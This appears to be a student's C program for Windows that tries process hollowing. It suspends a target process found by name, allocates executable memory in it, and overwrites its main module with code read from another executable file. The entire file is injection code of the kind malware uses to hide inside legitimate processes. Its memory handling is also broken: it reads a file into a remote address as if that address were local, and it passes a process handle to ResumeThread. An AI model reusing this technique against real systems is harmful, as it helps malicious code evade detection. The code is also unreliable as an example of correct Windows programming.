#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <psapi.h>

// Function to suspend a process by its process ID
int SuspendProcess(DWORD processId)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return -1;

    THREADENTRY32 te;
    te.dwSize = sizeof(THREADENTRY32);

    if (Thread32First(hSnapshot, &te))
    {
        do
        {
            if (te.th32OwnerProcessID == processId)
            {
                HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                if (hThread != NULL)
                {
                    SuspendThread(hThread);
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hSnapshot, &te));
    }

    CloseHandle(hSnapshot);
    return 1;
}

// Function to inject code into a process by process ID
void InjectCode(DWORD processId, const char* replacementPath)
{
    // Open the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL)
    {
        printf("Failed to open target process.\n");
        return;
    }

    // Suspend the target process
    if (SuspendProcess(processId) == -1)
    {
        printf("Failed to suspend target process.\n");
        CloseHandle(hProcess);
        return;
    }

    // Allocate memory in the target process for the replacement code
    // DWORD replacementSize = GetFileSize(replacementPath, NULL);
    HANDLE hFile = CreateFile(replacementPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
if (hFile == INVALID_HANDLE_VALUE) {
    printf("Failed to open replacement file.\n");
    return;
}

LARGE_INTEGER fileSize;
if (!GetFileSizeEx(hFile, &fileSize)) {
    printf("Failed to get replacement file size.\n");
    CloseHandle(hFile);
    return;
}

DWORD replacementSize = (DWORD)fileSize.QuadPart;
CloseHandle(hFile);

    LPVOID replacementCode = VirtualAllocEx(hProcess, NULL, replacementSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (replacementCode == NULL)
    {
        printf("Failed to allocate memory in target process.\n");
        CloseHandle(hProcess);
        return;
    }

    // Read the replacement code from the file
    hFile = CreateFile(replacementPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile != INVALID_HANDLE_VALUE)
    {
        DWORD bytesRead;
        ReadFile(hFile, replacementCode, replacementSize, &bytesRead, NULL);
        CloseHandle(hFile);
    }

    // Get the base address of the main module
    HMODULE hModule = NULL;
    DWORD cbNeeded;
    if (EnumProcessModules(hProcess, &hModule, sizeof(HMODULE), &cbNeeded))
    {
        // Write the replacement code to the main process
        if (!WriteProcessMemory(hProcess, hModule, replacementCode, replacementSize, NULL))
        {
            printf("Failed to write process memory.\n");
            VirtualFreeEx(hProcess, replacementCode, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return;
        }
    }

    // Resume the target process
    if (ResumeThread(hProcess) == -1)
    {
        printf("Failed to resume target process.\n");
    }
    else
    {
        printf("Process code injection completed.\n");
    }

    // Clean up
    VirtualFreeEx(hProcess, replacementCode, 0, MEM_RELEASE);
    CloseHandle(hProcess);
}

int main()
{
    const char targetPath[] = "HelloWorld.exe";
    const char replacementPath[] = "D:\\Drive\\APranav\\Capstone\\Phase2\\Process_Hollowing\\NotHelloWorld.exe";

    // Get the process ID of the target process
    DWORD targetProcessId = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe))
        {
            do
            {
                if (lstrcmpi(pe.szExeFile, targetPath) == 0)
                {
                    targetProcessId = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }

    if (targetProcessId == 0)
    {
        printf("Target process not found.\n");
        return 0;
    }

    InjectCode(targetProcessId, replacementPath);


    getchar();
    return 0;
}
